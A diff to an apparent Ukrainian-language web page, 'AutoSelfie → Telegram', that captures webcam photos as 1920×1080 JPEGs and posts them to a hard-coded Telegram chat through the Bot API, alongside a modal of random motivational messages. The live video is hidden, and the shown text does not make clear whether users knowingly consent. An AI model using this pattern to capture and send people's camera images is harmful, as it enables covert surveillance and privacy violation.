@@ -2,7 +2,7 @@
 <html lang="uk">
 <head>
   <meta charset="utf-8" />
-  <title>AutoSelfie → Telegram (модаль 800×800, 24 елементи)</title>
+  <title>AutoSelfie → Telegram (1920×1080 фото)</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     :root{
@@ -35,8 +35,22 @@
     }
     .caption-area{margin:8px 0 14px 0}
     .caption-area .static-text{color:var(--muted);font-size:14px}
-    video{width:100%;max-width:640px;border-radius:10px;background:#000;display:none}
-    canvas{width:100%;max-width:640px;border-radius:10px;background:#000;display:none;margin-top:12px}
+    video{
+      width:100%;
+      max-width:640px;
+      border-radius:10px;
+      background:#000;
+      display:none;
+    }
+    /* canvas показуємо після зйомки; але розмір для відправки буде 1920x1080 */
+    canvas{
+      width:100%;
+      max-width:640px;
+      border-radius:10px;
+      background:#000;
+      display:none;
+      margin-top:12px;
+    }
     .controls{margin-top:12px}
     button{
       padding:12px 18px;border-radius:8px;border:none;background:var(--accent);
@@ -45,7 +59,7 @@
     button:disabled{opacity:.6;cursor:default}
     .note{font-size:13px;color:var(--muted);margin-top:10px}
 
-    /* Модальне вікно — збільшене під картинку 800x800 */
+    /* Модальне вікно — під картинку 800x800 */
     .modal {
       position:fixed;
       inset:0;
@@ -61,7 +75,7 @@
       background:#07101a;
       border-radius:12px;
       padding:20px;
-      max-width:980px;      /* трохи більше за картинку */
+      max-width:980px;
       width:100%;
       box-sizing:border-box;
       display:flex;
@@ -70,7 +84,6 @@
       max-height:calc(100vh - 60px);
       overflow:auto;
     }
-    /* Картинка 800x800 (на великих екранах) */
     .modal-card img{
       width:800px;
       height:800px;
@@ -99,7 +112,6 @@
       padding:10px 14px;border-radius:8px;border:none;background:#10b981;color:#fff;cursor:pointer;
     }
 
-    /* Адаптивність для мобільних: картинка займає ширину екрану */
     @media (max-width:980px){
       .modal-card{
         flex-direction:column;
@@ -182,7 +194,7 @@
       "Залишайся собою — це найкраще.",
       "Кожен кадр — це шанс на нову історію."
     ];
-    // ====== 24 картинок (приклади) ======
+    // ====== 24 картинок (приклади 800x800) ======
     const RANDOM_IMAGES = [
       "https://via.placeholder.com/800x800.png?text=Img+1",
       "https://via.placeholder.com/800x800.png?text=Img+2",
@@ -296,7 +308,6 @@
       modalText.textContent = RANDOM_MESSAGES[idx];
       modal.classList.add('open');
 
-      // Автозакриття через 6 секунд
       clearTimeout(modalTimer);
       modalTimer = setTimeout(() => closeModal(), 6000);
     }
@@ -306,27 +317,53 @@
       clearTimeout(modalTimer);
     }
 
+    // Малює відео на canvas з режимом cover (заповнення 1920x1080 з обрізкою по центру)
+    function drawVideoCoverToCanvas(ctx, vw, vh, cw = 1920, ch = 1080) {
+      const videoRatio = vw / vh;
+      const canvasRatio = cw / ch;
+      let sx = 0, sy = 0, sWidth = vw, sHeight = vh;
+
+      if (videoRatio > canvasRatio) {
+        // відео ширше — обрізаємо по ширині
+        sWidth = Math.round(vh * canvasRatio);
+        sx = Math.round((vw - sWidth) / 2);
+      } else {
+        // відео вищий — обрізаємо по висоті
+        sHeight = Math.round(vw / canvasRatio);
+        sy = Math.round((vh - sHeight) / 2);
+      }
+      ctx.drawImage(video, sx, sy, sWidth, sHeight, 0, 0, cw, ch);
+    }
+
     async function takePhotoAndSend(){
       if (!cameraActive) return;
-      const w = video.videoWidth || 640;
-      const h = video.videoHeight || 480;
-      canvas.width = w;
-      canvas.height = h;
+
+      // Встановлюємо canvas у потрібний розмір 1920x1080 для відправки
+      const SEND_W = 1920;
+      const SEND_H = 1080;
+      canvas.width = SEND_W;
+      canvas.height = SEND_H;
       const ctx = canvas.getContext('2d');
 
-      ctx.drawImage(video, 0, 0, w, h);
+      // Малюємо відео на canvas з режимом cover (щоб заповнити 1920x1080)
+      const vw = video.videoWidth || SEND_W;
+      const vh = video.videoHeight || SEND_H;
+      drawVideoCoverToCanvas(ctx, vw, vh, SEND_W, SEND_H);
+
+      // Показуємо зменшений прев'ю на сторінці (CSS масштабує)
       canvas.style.display = "block";
 
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+      // Отримуємо JPEG з якістю 0.85 (менше розмір ніж PNG)
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
       if (!blob) {
         alert('Не вдалося сформувати зображення.');
         return;
       }
 
-      // Відправка селфі в Telegram
+      // Відправка селфі в Telegram (Bot API, ліміт 50 МБ)
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
-      form.append('photo', blob, 'selfie.png');
+      form.append('photo', blob, 'selfie.jpg');
 
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
@@ -362,12 +399,10 @@
     modalClose.addEventListener('click', closeModal);
     modalOk.addEventListener('click', closeModal);
 
-    // Закрити модал при кліку поза карткою
     modal.addEventListener('click', (e) => {
       if (e.target === modal) closeModal();
     });
 
-    // Закрити клавішею Escape
     document.addEventListener('keydown', (e) => {
       if (e.key === 'Escape') closeModal();
     });
